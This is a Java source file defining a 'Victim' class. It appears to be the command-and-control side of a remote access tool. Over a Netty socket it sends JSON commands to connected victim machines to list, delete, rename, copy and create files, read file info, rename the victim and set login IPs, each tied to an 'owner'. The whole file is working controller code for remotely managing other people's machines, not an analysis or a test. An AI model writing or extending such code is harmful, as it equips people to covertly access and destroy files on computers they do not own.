import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.net.SocketAddress;
import java.util.ArrayList;

public class Victim {
    private ChannelHandlerContext context;
    private String name;
    private ArrayList<String> owners;

    public Victim(ChannelHandlerContext context, String name, ArrayList<String> owners) {
        this.context = context;
        this.name = name;
        this.owners = owners;
    }

    public void sendAuthVictim() {
        JSONObject query = new JSONObject();
        query.put("action", "auth.victim");
        sendMessage(query);
    }

    public void sendGetFiles(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.files");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendDeleteFile(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.file");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendMessage(JSONObject message) {
        SocketAddress address = context.channel().remoteAddress();
        System.out.println(address + " << " + message);
        context.writeAndFlush(message);
    }

    public String getName() {
        return name;
    }

    public ArrayList<String> getOwners() {
        return owners;
    }

    public void sendErrorCode(String errorCode) {
        JSONObject query = new JSONObject();
        query.put("errorCode", errorCode);
        sendMessage(query);
    }

    public void sendMakeDir(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "make.dir");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendRenameFile(String path, String newPath, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "rename.file");
        query.put("path", path);
        query.put("newPath", newPath);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendGetFileInfo(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.info");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendCopyFile(String path, String newPath, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "copy.file");
        query.put("path", path);
        query.put("newPath", newPath);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendSetVictimName(String newName, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.victim.name");
        query.put("newName", newName);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendSetLoginIps(JSONArray ips, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.login.ips");
        query.put("ips", ips);
        query.put("owner", owner);
        sendMessage(query);
    }


}
